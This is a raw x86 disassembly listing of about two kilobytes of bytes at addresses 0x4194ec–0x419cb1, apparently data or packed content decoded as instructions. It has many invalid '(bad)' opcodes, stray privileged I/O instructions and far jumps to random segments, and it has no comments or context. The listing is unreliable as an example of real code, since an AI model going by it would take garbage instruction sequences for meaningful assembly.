  4194ec:	arpl   WORD PTR [eax],sp
  4194ee:	cmp    al,0x39
  4194f0:	xchg   ecx,eax
  4194f1:	cwde   
  4194f2:	fadd   st(1),st
  4194f4:	cmp    dh,BYTE PTR [edx+0x532a82d9]
  4194fa:	es pop ds
  4194fc:	jp     0x419490
  4194fe:	xor    DWORD PTR [ecx+0x5548f2d9],ecx
  419504:	dec    eax
  419505:	mov    ebp,edi
  419507:	add    BYTE PTR [ecx-0x35b8b232],ch
  41950d:	and    edi,edi
  41950f:	scas   al,BYTE PTR es:[edi]
  419510:	mov    ds:0x9df96543,eax
  419515:	aas    
  419516:	jmp    0x41950c
  419518:	je     0x41958c
  41951a:	pop    edx
  41951b:	sub    al,0x2
  41951d:	sub    eax,DWORD PTR [edi-0x71a92d27]
  419523:	add    esp,DWORD PTR [edx-0x7a]
  419526:	dec    dl
  419528:	dec    ebx
  419529:	(bad)  
  41952a:	xor    DWORD PTR [eax-0x24c266de],eax
  419530:	adc    ebp,DWORD PTR [ebx+0x1895e9aa]
  419536:	mov    ecx,0xa4394175
  41953b:	(bad)
  41953e:	or     DWORD PTR [ebx+eiz*2-0x5363c190],esp
  419545:	mov    cl,0xf1
  419547:	sahf   
  419548:	lock mul BYTE PTR [ecx]
  41954b:	adc    edx,DWORD PTR [esi]
  41954d:	test   BYTE PTR [esi],bh
  41954f:	push   edx
  419550:	jbe    0x4194fb
  419552:	or     BYTE PTR [ebx],al
  419554:	sbb    ebx,DWORD PTR [esi-0x5e338c38]
  41955a:	das    
  41955b:	pop    ebp
  41955c:	sub    bh,bh
  41955e:	(bad)  
  41955f:	cmc    
  419560:	in     eax,0x24
  419562:	mov    bl,0x3b
  419564:	xor    dl,dh
  419566:	leave  
  419567:	push   eax
  419568:	cdq    
  419569:	outs   dx,BYTE PTR ds:[esi]
  41956a:	fs pop DWORD PTR ds:[eax+ebp*4]
  41956f:	push   ss
  419570:	aam    0x9e
  419572:	je     0x419536
  419574:	hlt    
  419575:	loope  0x41959b
  419577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419578:	outs   dx,BYTE PTR ds:[esi]
  419579:	push   es
  41957a:	mov    esp,0xe2872f39
  41957f:	sbb    al,0x88
  419581:	ins    DWORD PTR es:[edi],dx
  419582:	and    BYTE PTR ds:0xe1de493f,cl
  419588:	into   
  419589:	sbb    ah,BYTE PTR [ebx+edx*1]
  41958c:	les    edi,FWORD PTR ds:0x35b0201d
  419592:	retf   
  419593:	arpl   sp,cx
  419595:	sbb    al,0x30
  419597:	mov    DWORD PTR [ecx+0xd],ecx
  41959a:	jmp    0x4195a0
  41959c:	lock jnp 0x4195c2
  41959f:	and    eax,0x1bf43756
  4195a4:	cs inc esi
  4195a6:	loop   0x419585
  4195a8:	in     al,dx
  4195a9:	jno    0x419579
  4195ab:	jne    0x41958a
  4195ad:	ror    BYTE PTR [edx*1+0x6f9923e9],1
  4195b4:	adc    ebx,esi
  4195b6:	xchg   ecx,eax
  4195b7:	xor    DWORD PTR [eax],edi
  4195b9:	dec    esi
  4195ba:	int    0x5
  4195bc:	aaa    
  4195bd:	shr    DWORD PTR [edx+0x6f91f790],cl
  4195c3:	xchg   ebx,eax
  4195c4:	lds    eax,FWORD PTR ds:0x2ebab2f0
  4195ca:	dec    edx
  4195cb:	mov    BYTE PTR [edx],dh
  4195cd:	xor    DWORD PTR [edx+ebx*4+0x36f5309c],ebp
  4195d4:	scas   eax,DWORD PTR es:[edi]
  4195d5:	xchg   ecx,eax
  4195d6:	fsubr  st(7),st
  4195d8:	xor    DWORD PTR [esi-0x19d0ba88],0xd0ad5fbc
  4195e2:	fiadd  DWORD PTR [ebx-0x7d]
  4195e5:	inc    esp
  4195e6:	mov    al,0x3f
  4195e8:	xchg   ecx,eax
  4195e9:	aam    0x60
  4195eb:	add    BYTE PTR [ecx+0x69],ch
  4195ee:	jle    0x9a80acfd
  4195f4:	sub    DWORD PTR [eax-0x3d],edi
  4195f7:	das    
  4195f8:	test   eax,0xb3f05409
  4195fd:	xchg   edx,eax
  4195fe:	clc    
  4195ff:	or     BYTE PTR [edi-0x6f],0x69
  419603:	sub    eax,0xd47832ee
  419608:	in     eax,0xbd
  41960a:	nop
  41960b:	fdivr  DWORD PTR [eax]
  41960d:	adc    al,0x17
  41960f:	jbe    0x41964c
  419611:	xor    al,0x66
  419613:	and    ebp,esi
  419615:	js     0x419658
  419617:	test   BYTE PTR ds:0xb17d0228,bl
  41961d:	pushf  
  41961e:	ja     0x41964f
  419620:	and    al,0xbd
  419622:	icebp  
  419623:	fwait
  419624:	js     0x4195e9
  419626:	js     0x419682
  419628:	shl    BYTE PTR fs:[ecx-0x62e429ee],cl
  41962f:	lds    ebx,FWORD PTR [eax+esi*8]
  419632:	hlt    
  419633:	xor    ebx,DWORD PTR [edi]
  419635:	(bad)  
  419636:	mov    ebp,0xb84ee2dd
  41963b:	sar    DWORD PTR [ecx+eiz*4],cl
  41963e:	nop
  41963f:	mov    WORD PTR [ebp+0x33],?
  419642:	inc    ebp
  419643:	dec    esi
  419644:	cwde   
  419645:	pop    edx
  419646:	test   al,0x2e
  419648:	push   0xbcc78192
  41964d:	mov    edi,0x6e3c689f
  419652:	push   ebx
  419653:	or     ch,0xc
  419656:	stos   DWORD PTR es:[edi],eax
  419657:	lahf   
  419658:	pop    ebp
  419659:	sub    DWORD PTR [esi+0x31],ebx
  41965c:	pop    edx
  41965d:	enter  0xf990,0xcd
  419661:	mov    edi,0xc65c547b
  419666:	and    edi,DWORD PTR [ecx+ebx*4]
  419669:	sbb    al,0xfc
  41966b:	xchg   ecx,eax
  41966c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41966d:	(bad)  [ebx]
  41966f:	pop    ds
  419670:	sub    BYTE PTR [esi-0x53],bh
  419673:	mov    ebp,0x1786dbd9
  419678:	dec    dl
  41967a:	inc    ebp
  41967b:	mov    bl,0xf1
  41967d:	cmp    al,0xae
  41967f:	dec    ebx
  419680:	inc    esi
  419681:	and    ah,ch
  419683:	gs mov eax,0x66e10e3a
  419689:	out    0x1e,al
  41968b:	(bad)  
  41968d:	sti    
  41968e:	or     eax,0xbaf7be1f
  419693:	sahf   
  419694:	lds    ecx,FWORD PTR [ebx]
  419696:	inc    eax
  419697:	out    dx,al
  419698:	rcr    DWORD PTR gs:[edi],cl
  41969b:	sbb    ecx,ebx
  41969d:	ds jnp 0x419649
  4196a0:	fs (bad) 
  4196a3:	test   al,0xf9
  4196a5:	ins    BYTE PTR es:[edi],dx
  4196a6:	dec    ecx
  4196a7:	mov    dl,0xec
  4196a9:	cmp    ah,BYTE PTR [esi+0x61]
  4196ac:	outs   dx,BYTE PTR ds:[esi]
  4196ad:	cli    
  4196ae:	int3   
  4196af:	(bad)  
  4196b1:	inc    eax
  4196b2:	and    DWORD PTR [eax+ecx*1],ebp
  4196b5:	sub    DWORD PTR [eax],ebp
  4196b7:	jae    0x419709
  4196b9:	cmp    eax,0x6c659c50
  4196be:	mov    dh,0xe1
  4196c0:	mov    WORD PTR [esi+0x39],bx
  4196c4:	sbb    BYTE PTR ds:0x57736e1e,dh
  4196ca:	rcr    DWORD PTR [ebp-0x7b9edb72],cl
  4196d0:	not    ebp
  4196d2:	xor    al,0xf4
  4196d4:	mov    edi,0x3e54b42a
  4196d9:	outs   dx,BYTE PTR ds:[esi]
  4196da:	(bad)  
  4196db:	addr16 jge 0x41975c
  4196de:	retf   0x8938
  4196e1:	in     al,dx
  4196e2:	cmp    BYTE PTR [ebx-0x72d9d271],ch
  4196e8:	adc    DWORD PTR [ebx],esp
  4196ea:	sub    esi,DWORD PTR [esi-0x5753a031]
  4196f0:	jle    0x4196ab
  4196f2:	or     BYTE PTR [ebx+ebp*4-0x77e452ba],dl
  4196f9:	xor    al,0x25
  4196fb:	inc    ebp
  4196fc:	or     esp,edx
  4196fe:	adc    DWORD PTR [edx+0x6304ee2c],edx
  419704:	jno    0x4196a6
  419706:	dec    edi
  419707:	sbb    ecx,ecx
  419709:	sbb    ecx,eax
  41970b:	add    al,0xe9
  41970d:	fadd   st,st(1)
  41970f:	sbb    esi,DWORD PTR [edx-0x6214b821]
  419715:	int    0xe0
  419717:	dec    eax
  419718:	loopne 0x419770
  41971a:	shl    BYTE PTR ds:0xdba48638,0x5d
  419721:	push   ecx
  419722:	addr16 or al,0xde
  419725:	add    eax,0xb3dad074
  41972a:	outs   dx,BYTE PTR ds:[esi]
  41972b:	arpl   si,si
  41972d:	ficomp DWORD PTR [eax]
  41972f:	and    eax,0x2d91da34
  419734:	iret   
  419735:	and    al,0xe0
  419737:	aam    0x7b
  419739:	std    
  41973a:	pop    edi
  41973b:	test   DWORD PTR [ecx],eax
  41973d:	stc    
  41973e:	mov    dh,BYTE PTR [edx+0x5d94056e]
  419744:	xor    eax,0xa8819d91
  419749:	mov    ebp,0x8a16d851
  41974e:	jg     0x4197c5
  419750:	jb     0x41970f
  419752:	mov    ds:0x8b230ef4,eax
  419757:	pop    ecx
  419758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419759:	dec    edi
  41975a:	push   0xffffff9e
  41975c:	cmp    BYTE PTR [eax+0x111eae60],dl
  419762:	loope  0x4197de
  419764:	dec    esp
  419765:	pop    esp
  419766:	pop    esp
  419767:	and    eax,DWORD PTR [edx-0x75]
  41976a:	jmp    0x41970b
  41976c:	(bad)  
  41976d:	push   ss
  41976e:	mov    ah,0x1d
  419770:	(bad)  
  419771:	cmp    al,0xfb
  419773:	bswap  ecx
  419775:	dec    edi
  419776:	test   eax,0x1cd95a80
  41977b:	pop    eax
  41977c:	sub    DWORD PTR [ebp+0x1d1df578],esp
  419782:	popf   
  419783:	push   eax
  419784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419785:	pop    ebp
  419786:	xor    ch,BYTE PTR [ebx+0x91c12a3]
  41978c:	mov    ecx,0xe787c7c1
  419791:	dec    eax
  419792:	adc    al,0x64
  419794:	pop    esp
  419795:	inc    esi
  419796:	iret   
  419797:	adc    eax,0xe6cc016f
  41979c:	(bad)  
  41979d:	int    0xc4
  41979f:	or     BYTE PTR [esi-0x30],dh
  4197a2:	lods   al,BYTE PTR ds:[esi]
  4197a3:	dec    esi
  4197a4:	loop   0x41980c
  4197a6:	out    dx,al
  4197a7:	inc    ebx
  4197a8:	fwait
  4197a9:	js     0x41976b
  4197ab:	fimul  DWORD PTR [edi]
  4197ad:	sti    
  4197ae:	(bad)  
  4197af:	mov    bl,0xca
  4197b1:	sbb    ch,BYTE PTR [ecx+0x3fd8b148]
  4197b7:	pop    ecx
  4197b8:	dec    esi
  4197b9:	dec    edi
  4197ba:	neg    bh
  4197bc:	sti    
  4197bd:	lahf   
  4197be:	into   
  4197bf:	stc    
  4197c0:	or     DWORD PTR [esi+ebx*8+0x7cbad5c7],ebp
  4197c7:	int3   
  4197c8:	(bad)  
  4197c9:	fild   QWORD PTR [edi+0x5281654f]
  4197cf:	(bad)  
  4197d0:	sar    BYTE PTR [ecx-0x8],cl
  4197d3:	imul   ecx,DWORD PTR [eax],0xfffffff2
  4197d6:	js     0x4197d4
  4197d8:	call   0xfb77:0x2c8f4e23
  4197df:	add    ecx,DWORD PTR ds:0xfb00
  4197e4:	test   DWORD PTR [edi+edi*1-0x4b],ecx
  4197e8:	ffree  st(2)
  4197ea:	xchg   ecx,eax
  4197eb:	test   BYTE PTR [edx+0x67],bl
  4197ee:	(bad)  [ebp-0x2bd914a9]
  4197f4:	jmp    0x280:0x7ed05c67
  4197fb:	xchg   DWORD PTR [ebp+0x53],eax
  4197fe:	lds    edi,FWORD PTR [ebp+ebx*4-0x263b37c3]
  419805:	and    eax,DWORD PTR [eax]
  419807:	sbb    BYTE PTR [ebx-0x352eb0f1],ch
  41980d:	(bad)  
  41980f:	mov    ebx,0x432a8834
  419814:	jb     0x419843
  419816:	fwait
  419817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419818:	retf   
  419819:	out    0x9c,eax
  41981b:	je     0x4197af
  41981d:	mov    dl,0xbb
  41981f:	retf   
  419820:	cmp    al,0x12
  419822:	mov    bh,0xf7
  419824:	in     al,0x34
  419826:	xor    al,0x5e
  419828:	dec    eax
  419829:	mov    esi,0xe420d2e8
  41982e:	mov    ah,0xf
  419830:	into   
  419831:	inc    eax
  419832:	pop    edx
  419833:	ret    
  419834:	and    dh,al
  419836:	aas    
  419837:	rol    DWORD PTR [ebp+0xf],cl
  41983a:	iret   
  41983b:	sub    ah,bh
  41983d:	xor    al,0x25
  41983f:	int3   
  419840:	jle    0x41984d
  419842:	shl    BYTE PTR [edx+eiz*8+0x3c],cl
  419846:	test   eax,0x4ef4b501
  41984b:	add    edx,ecx
  41984d:	jl     0x4197fe
  41984f:	xor    eax,DWORD PTR [ebx+eiz*1-0x58]
  419853:	in     eax,0x45
  419855:	inc    esi
  419856:	in     al,0x11
  419858:	ss mov dl,0x25
  41985b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41985c:	sbb    ebx,DWORD PTR [ebx-0x3f39505d]
  419862:	jp     0x419873
  419864:	popf   
  419865:	(bad)  
  419866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419867:	ins    DWORD PTR es:[edi],dx
  419868:	dec    esp
  419869:	neg    eax
  41986b:	sub    BYTE PTR [eax+0x4e],ch
  41986e:	pop    es
  41986f:	mov    ch,0xa9
  419871:	out    dx,eax
  419872:	xor    esp,ecx
  419874:	mov    edi,0xd0168a44
  419879:	scas   eax,DWORD PTR es:[edi]
  41987a:	in     eax,0x83
  41987c:	add    eax,0x9133029c
  419881:	sub    DWORD PTR [edi-0x4906b9bf],ebp
  419887:	sti    
  419888:	sub    al,BYTE PTR [edx+0x1]
  41988b:	into   
  41988c:	scas   al,BYTE PTR es:[edi]
  41988d:	loope  0x41986a
  41988f:	jg     0x41988b
  419891:	enter  0x23c6,0x5d
  419895:	cmc    
  419896:	sahf   
  419897:	clc    
  419898:	sbb    ch,BYTE PTR [esi]
  41989a:	js     0x4198f2
  41989c:	dec    eax
  41989d:	or     eax,0xbcb29bab
  4198a2:	dec    edx
  4198a3:	mov    dh,0x69
  4198a5:	ss xchg edi,eax
  4198a7:	retf   0xbaab
  4198aa:	adc    al,0xc5
  4198ac:	fsub   DWORD PTR [ebx-0xa69a68c]
  4198b2:	xor    DWORD PTR [edx],esp
  4198b4:	mov    WORD PTR [edi+0x74],?
  4198b7:	or     DWORD PTR [ebx-0x6],esp
  4198ba:	jecxz  0x419891
  4198bc:	outs   dx,BYTE PTR ds:[esi]
  4198bd:	jmp    0xb7ba:0x794a9c1c
  4198c4:	addr16 and eax,0x921633b8
  4198ca:	push   edi
  4198cb:	out    0xb0,eax
  4198cd:	push   es
  4198ce:	lahf   
  4198cf:	pop    ecx
  4198d0:	push   es
  4198d1:	sar    ebx,0x7a
  4198d4:	jecxz  0x41991a
  4198d6:	fsubr  DWORD PTR [eax+0x0]
  4198d9:	adc    ebx,DWORD PTR [ebx]
  4198db:	jl     0x4198f0
  4198dd:	retf   
  4198de:	in     eax,dx
  4198df:	(bad)  
  4198e0:	into   
  4198e1:	cli    
  4198e2:	fdiv   QWORD PTR [ecx+0x3a]
  4198e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e6:	mov    esp,0x3f8d5927
  4198eb:	fadd   DWORD PTR [eax]
  4198ed:	inc    esi
  4198ee:	and    ch,BYTE PTR [edi+0x616d6d7c]
  4198f4:	pop    es
  4198f5:	sub    BYTE PTR [ecx],bh
  4198f7:	adc    al,cl
  4198f9:	arpl   WORD PTR [edx],sp
  4198fb:	mov    ebp,0xc796b8de
  419900:	sub    bl,cl
  419902:	std    
  419903:	out    dx,al
  419904:	mov    ds:0xdf070ca8,al
  419909:	dec    esp
  41990a:	data16 lods al,BYTE PTR ds:[esi]
  41990c:	mov    ecx,0x15d1dce4
  419911:	(bad)  
  419912:	call   0xbf73be08
  419917:	stos   DWORD PTR es:[edi],eax
  419918:	retf   0xb0dc
  41991b:	xchg   esp,eax
  41991c:	jne    0x4198cc
  41991e:	xor    edi,DWORD PTR [edi+0x597ea5c6]
  419924:	mov    ch,0x95
  419926:	xchg   esi,eax
  419927:	mov    al,0x68
  419929:	xor    BYTE PTR [esi-0x4d],bh
  41992c:	mov    ds:0x369a522c,eax
  419931:	cmp    al,0xb7
  419933:	pop    ebp
  419934:	(bad)  
  419935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419936:	sbb    eax,0x44db19ec
  41993b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41993c:	frstor [ecx+esi*4-0x3851b90a]
  419943:	and    bh,cl
  419945:	jmp    0x3809:0x4a37482d
  41994c:	push   esp
  41994d:	xor    BYTE PTR [ecx],0x37
  419950:	popf   
  419951:	mov    gs,eax
  419953:	(bad)  [edi]
  419955:	ret    0x611
  419958:	(bad)  
  419959:	lods   al,BYTE PTR ds:[esi]
  41995a:	push   edi
  41995b:	popa   
  41995c:	mov    al,BYTE PTR [esi-0x6c]
  41995f:	out    0x46,al
  419961:	aam    0xfe
  419963:	sub    al,0x81
  419965:	add    ecx,DWORD PTR [edi+edi*4-0x5886cc05]
  41996c:	xchg   BYTE PTR [esi+0x1c84a713],bh
  419972:	mov    ds:0x9b819b43,ax
  419978:	jle    0x419926
  41997a:	jmp    0x9053:0xc12cca96
  419981:	not    BYTE PTR [ecx+0x1be0ea00]
  419987:	mov    bh,0x2a
  419989:	outs   dx,DWORD PTR ds:[esi]
  41998a:	in     eax,dx
  41998b:	dec    esp
  41998c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41998d:	pusha  
  41998e:	fdivr  st,st(4)
  419990:	pop    ecx
  419991:	in     eax,dx
  419992:	js     0x419914
  419994:	cwde   
  419995:	mov    fs,esi
  419997:	hlt    
  419998:	inc    ebp
  419999:	scas   al,BYTE PTR es:[edi]
  41999a:	out    0x82,eax
  41999c:	aas    
  41999d:	lock out dx,al
  41999f:	in     eax,dx
  4199a0:	loopne 0x419945
  4199a2:	pop    ecx
  4199a3:	jo     0x4199b4
  4199a5:	daa    
  4199a6:	jle    0x4199d3
  4199a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a9:	xor    ah,BYTE PTR [eax]
  4199ab:	sbb    cl,dh
  4199ad:	mov    eax,0xd9cca1a3
  4199b2:	xchg   ecx,eax
  4199b3:	and    DWORD PTR [ecx-0x77],ebp
  4199b6:	push   eax
  4199b7:	aam    0xd0
  4199b9:	retf   
  4199ba:	idiv   BYTE PTR [edi-0x6891db1]
  4199c0:	xchg   esp,eax
  4199c2:	xor    al,0x2b
  4199c4:	add    DWORD PTR [edi-0x55446170],0xffffffbe
  4199cb:	jo     0x4199f2
  4199cd:	cmp    dl,BYTE PTR [ebp+edi*2-0x5d0573a5]
  4199d4:	mov    ds:0x5eb0efa1,al
  4199d9:	stc    
  4199da:	(bad)
  4199dd:	arpl   WORD PTR [ecx-0x44],sp
  4199e0:	or     eax,0x3823b7ed
  4199e5:	add    dl,ch
  4199e7:	ds fsubr st,st(4)
  4199ea:	test   DWORD PTR [eax],0xb0aacd91
  4199f0:	retf   
  4199f1:	sti    
  4199f2:	xchg   edi,eax
  4199f3:	push   ebx
  4199f4:	xor    al,0xee
  4199f6:	paddw  xmm5,xmm5
  4199fa:	mov    edi,0x40414726
  4199ff:	sub    dl,BYTE PTR [ebx+edx*1+0x1e]
  419a03:	shl    DWORD PTR [ecx],1
  419a05:	jo     0x4199d0
  419a07:	and    al,0x91
  419a09:	sbb    BYTE PTR [eax+0x45],0xec
  419a0d:	or     ah,BYTE PTR ss:[eax-0x74]
  419a11:	lods   al,BYTE PTR ds:[esi]
  419a12:	jmp    0x4ae:0xcee16095
  419a19:	imul   esi,ebp,0x41
  419a1c:	lahf   
  419a1d:	adc    DWORD PTR [eax-0x3e],0x5c577fbd
  419a24:	fs inc eax
  419a26:	pop    esp
  419a27:	scas   eax,DWORD PTR es:[edi]
  419a28:	sbb    esp,DWORD PTR ds:0xa1805865
  419a2e:	push   ds
  419a2f:	and    al,0x7
  419a31:	jl     0x4199d0
  419a33:	cmp    dl,dl
  419a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a36:	mov    bl,0x68
  419a38:	sbb    esp,edx
  419a3a:	popf   
  419a3b:	jns    0x419a31
  419a3d:	addr16 gs pusha 
  419a40:	add    ebx,edx
  419a42:	rcl    BYTE PTR [eax],cl
  419a44:	xchg   ebx,eax
  419a45:	xor    al,0x3
  419a47:	stc    
  419a48:	icebp  
  419a49:	outs   dx,BYTE PTR ds:[esi]
  419a4a:	inc    esp
  419a4b:	mov    esp,0x844bc822
  419a50:	dec    ebx
  419a51:	jecxz  0x419a6a
  419a53:	sub    al,0x7b
  419a55:	(bad)  
  419a56:	sub    eax,0x6c7942d4
  419a5b:	push   eax
  419a5c:	mov    ds:0x8b87346b,eax
  419a61:	mov    eax,ds:0xeede71a7
  419a66:	adc    al,0x9f
  419a68:	mov    eax,0x94017561
  419a6d:	pop    ss
  419a6e:	hlt    
  419a6f:	mov    ds:0x19c99e3b,al
  419a74:	gs mov dh,0xab
  419a77:	add    bl,BYTE PTR [edx+0x18]
  419a7a:	inc    ebx
  419a7b:	xor    esi,DWORD PTR [esi-0x293a8fba]
  419a81:	pushaw 
  419a83:	and    eax,0xdd95bd31
  419a88:	cld    
  419a89:	in     eax,0x5a
  419a8b:	and    ecx,DWORD PTR [esi]
  419a8d:	ret    0x8514
  419a90:	xor    bl,BYTE PTR [eax-0x41a76d23]
  419a96:	jle    0x419a1f
  419a98:	stos   BYTE PTR es:[edi],al
  419a99:	ror    cl,cl
  419a9b:	jb     0x419a35
  419a9d:	aaa    
  419a9e:	mov    edx,0x14c7ebb5
  419aa3:	cld    
  419aa4:	cwde   
  419aa5:	and    al,0x73
  419aa7:	xchg   ebx,eax
  419aa8:	jmp    0x2990:0xf3f5f326
  419aaf:	xchg   edi,eax
  419ab0:	pop    esi
  419ab1:	fcmovu st,st(7)
  419ab3:	xlat   BYTE PTR ds:[ebx]
  419ab4:	or     esp,DWORD PTR [edx+0x61f8b863]
  419aba:	jl     0x419ae3
  419abc:	outs   dx,DWORD PTR ds:[esi]
  419abd:	loope  0x419a5e
  419abf:	bound  ebx,QWORD PTR ds:0x8a5f5488
  419ac5:	fwait
  419ac6:	stos   BYTE PTR es:[edi],al
  419ac7:	call   0x88f3:0x78ceadf9
  419ace:	test   al,0xd7
  419ad0:	mov    ebx,0xb70b6ff3
  419ad5:	scas   al,BYTE PTR es:[edi]
  419ad6:	pop    ds
  419ad7:	mov    ds:0x86897aae,eax
  419adc:	cld    
  419add:	inc    ebp
  419ade:	ins    DWORD PTR es:[edi],dx
  419adf:	pop    eax
  419ae0:	pop    esi
  419ae1:	and    ch,dh
  419ae3:	dec    edx
  419ae4:	sub    al,0xc8
  419ae6:	rcr    BYTE PTR [ecx],1
  419ae8:	or     BYTE PTR [esi],dl
  419aea:	sbb    dl,bl
  419aec:	ror    ecx,0x33
  419aef:	adc    al,ah
  419af1:	mov    WORD PTR [ebx+0x56ce7ca0],?
  419af7:	sbb    eax,0x40622ee6
  419afc:	in     eax,dx
  419afd:	fild   WORD PTR [eax-0x4a]
  419b00:	sub    ebx,DWORD PTR [esi]
  419b02:	sbb    al,0x7a
  419b04:	xor    al,0x41
  419b06:	repnz xchg esi,eax
  419b08:	loop   0x419ab0
  419b0a:	imul   edi,DWORD PTR [esi+0x12],0xffffff9d
  419b0e:	and    eax,0x1589971f
  419b13:	jb     0x419b09
  419b15:	icebp  
  419b16:	adc    eax,0xa03a4728
  419b1b:	in     al,dx
  419b1c:	mov    edx,ebx
  419b1e:	inc    ebx
  419b1f:	out    0xaf,al
  419b21:	mov    esi,0x75efbe60
  419b26:	lahf   
  419b27:	sbb    dl,BYTE PTR [edi+0x731e2f9c]
  419b2d:	jmp    0xa8bb:0x7e406027
  419b34:	pop    edi
  419b35:	add    DWORD PTR [edi-0x19],0x359540c9
  419b3c:	jno    0x419b99
  419b3e:	gs int3 
  419b40:	aad    0x44
  419b42:	sbb    dl,BYTE PTR [edi-0x4d6de39]
  419b48:	or     DWORD PTR [edx-0x732cbc75],ebp
  419b4e:	pop    ebp
  419b4f:	(bad)  
  419b50:	repnz xchg ebx,eax
  419b52:	sahf   
  419b53:	cmp    DWORD PTR [ebx-0x653abe94],ecx
  419b59:	or     eax,0xda1e408b
  419b5e:	bound  eax,QWORD PTR [eax+eax*8-0x21b15cc6]
  419b65:	mov    cl,0x24
  419b67:	mov    ah,0x8d
  419b69:	xchg   edi,eax
  419b6a:	push   ecx
  419b6b:	inc    ebx
  419b6c:	rol    BYTE PTR [esi+0x10705871],1
  419b72:	mov    eax,0xf6e219fd
  419b77:	out    dx,al
  419b78:	add    eax,0x9b99ad5c
  419b7d:	mov    ds:0x91f25ccd,eax
  419b82:	sub    eax,0x85a97fa2
  419b87:	adc    al,0xf7
  419b89:	push   ebp
  419b8a:	inc    ebp
  419b8b:	jb     0x419b5b
  419b8d:	test   al,0x65
  419b8f:	mov    DWORD PTR [ebp-0x24],esi
  419b92:	stos   BYTE PTR es:[edi],al
  419b93:	xor    al,0xfd
  419b95:	cdq    
  419b96:	or     BYTE PTR [edi],ch
  419b98:	inc    edi
  419b99:	inc    ecx
  419b9a:	push   0x66
  419b9c:	cli    
  419b9d:	mov    WORD PTR [eax],?
  419b9f:	enter  0x8c54,0x17
  419ba3:	test   eax,0x7c0ee9ea
  419ba8:	test   al,0x63
  419baa:	pusha  
  419bab:	arpl   cx,bx
  419bad:	xchg   BYTE PTR [eax],dh
  419baf:	jmp    0x419c22
  419bb1:	mov    ds:0x9a375539,al
  419bb6:	cmp    al,0xeb
  419bb8:	hlt    
  419bb9:	call   0xecc477dc
  419bbe:	mov    ah,0x6
  419bc0:	inc    esi
  419bc1:	dec    esi
  419bc2:	lea    ebp,[esi+0x76]
  419bc5:	(bad)  
  419bc6:	fmul   DWORD PTR [eax+0x7e3ed404]
  419bcc:	fld    QWORD PTR [edi+0x14]
  419bcf:	pop    edx
  419bd0:	or     eax,0x3964232c
  419bd5:	cvtps2pi mm6,QWORD PTR [ecx+ebx*8+0x46]
  419bda:	mov    DWORD PTR [edi+0x71],edx
  419bdd:	mov    cl,0x37
  419bdf:	jp     0x419c48
  419be1:	shl    eax,cl
  419be3:	iret   
  419be4:	pop    esp
  419be5:	and    al,0xaa
  419be7:	push   esi
  419be8:	rcl    dl,cl
  419bea:	ds iret 
  419bec:	int    0x87
  419bee:	sbb    DWORD PTR [edx],edx
  419bf0:	jmp    0x419c66
  419bf2:	push   ds
  419bf3:	jno    0x419b8e
  419bf5:	sub    bh,dh
  419bf7:	imul   eax,DWORD PTR [edx+0x68],0x35
  419bfb:	fst    QWORD PTR [eax]
  419bfd:	stos   BYTE PTR es:[edi],al
  419bfe:	or     edi,ebx
  419c00:	adc    DWORD PTR [ecx-0x6d59e0ac],0x48
  419c07:	mov    dx,0x5bee
  419c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c0c:	fucomi st,st(0)
  419c0e:	int3   
  419c0f:	adc    BYTE PTR [edi],0x86
  419c12:	mov    edi,?
  419c14:	add    dh,bh
  419c16:	push   eax
  419c17:	aad    0xe
  419c19:	jmp    0xcaa6:0x14aad8a6
  419c20:	cmp    BYTE PTR [ebx+0x566b5f00],al
  419c26:	outs   dx,DWORD PTR ds:[esi]
  419c27:	retf   
  419c28:	pop    ecx
  419c29:	jnp    0x419c67
  419c2b:	add    eax,0xe5d96270
  419c30:	leave  
  419c31:	mov    eax,ds:0xb9fae165
  419c36:	aad    0xc5
  419c38:	retf   
  419c39:	jae    0x419cb2
  419c3b:	sub    edx,DWORD PTR [ebp-0x5020a67c]
  419c41:	neg    bh
  419c43:	adc    al,0xa2
  419c45:	call   DWORD PTR [ebx]
  419c47:	loope  0x419cb1
  419c49:	inc    edi
  419c4a:	leave  
  419c4b:	clc    
  419c4c:	stos   DWORD PTR es:[edi],eax
  419c4d:	add    al,0xab
  419c4f:	in     al,dx
  419c50:	inc    esp
  419c51:	pop    edi
  419c52:	add    BYTE PTR [edx-0x58],0xb7
  419c56:	ficom  WORD PTR [ebx+0x1345a6ea]
  419c5c:	(bad)  
  419c5d:	jg     0x419c60
  419c5f:	retf   
  419c60:	jecxz  0x419c3e
  419c62:	loopne 0x419c3d
  419c64:	clc    
  419c65:	mov    ebx,0xfa62feab
  419c6a:	cs loope 0x419ca4
  419c6d:	inc    edi
  419c6e:	sub    DWORD PTR [edx],edi
  419c70:	cmp    al,BYTE PTR [esi-0x13]
  419c73:	xor    al,0x7c
  419c75:	jmp    DWORD PTR [ebp+0x7a]
  419c78:	adc    DWORD PTR [edi-0x9],0xffffff82
  419c7c:	sub    DWORD PTR [edx-0x24f241c7],0xffffffc3
  419c83:	outs   dx,BYTE PTR ds:[esi]
  419c84:	sub    al,0xdf
  419c86:	shr    DWORD PTR [esi-0x16658130],1
  419c8c:	cld    
  419c8d:	aas    
  419c8e:	inc    edi
  419c8f:	repz and edx,edi
  419c92:	mov    al,ds:0x7da06be9
  419c97:	sub    BYTE PTR [edx],ch
  419c99:	mov    cl,0xa0
  419c9b:	iret   
  419c9c:	xchg   edi,eax
  419c9d:	push   0xffffffe5
  419c9f:	xor    edx,DWORD PTR [esi]
  419ca1:	sbb    eax,0x52604d61
  419ca6:	mov    edi,0x98808877
  419cab:	(bad)  
  419cac:	pop    ds
  419cad:	(bad)  
  419cae:	out    dx,al
  419caf:	xlat   BYTE PTR ds:[ebx]
  419cb0:	scas   eax,DWORD PTR es:[edi]
  419cb1:	add    al,ch
